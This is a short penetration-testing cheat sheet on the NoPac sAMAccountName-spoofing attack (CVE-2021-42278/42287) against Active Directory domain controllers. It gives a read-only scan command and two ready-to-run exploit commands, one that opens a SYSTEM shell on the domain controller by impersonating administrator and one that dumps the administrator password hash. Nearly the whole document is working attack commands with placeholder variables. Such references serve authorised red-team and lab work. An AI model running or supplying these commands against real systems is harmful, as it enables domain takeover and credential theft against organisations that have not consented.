# Nopac

## NoPac

### NoPac scan

Check whether the DC is vulnerable to CVE-2021-42278 / 42287 (sAMAccountName spoofing). Read-only scan.

```sh title:"Nopac Read-only check for sAMAccount spoofing CVEs"
python3 scanner.py $domain/$user:$pass -dc-ip $rhost_ip -use-ldap
```
<!-- cheat
var domain
var user
var pass
var rhost_ip
-->

### NoPac shell

Exploit NoPac to land a SYSTEM shell on the DC by impersonating administrator.

```sh title:"Exploit NoPac for SYSTEM shell impersonating admin"
python3 nopac.py $domain/$user:$pass -dc-ip $rhost_ip -dc-host $rhost_name -shell --impersonate administrator -use-ldap
```
<!-- cheat
var domain
var user
var pass
var rhost_ip
var rhost_name
-->

### NoPac dump hashes

Exploit NoPac and pipe straight into secretsdump to pull the administrator hash.

```sh title:"Exploit NoPac and secretsdump administrator hash"
python3 nopac.py $domain/$user:$pass -dc-ip $rhost_ip -dc-host $rhost_name --dump-hashes -use-ldap --impersonate administrator -use-ldap -dump -just-dc-user $domain/administrator
```
<!-- cheat
var domain
var user
var pass
var rhost_ip
var rhost_name
-->

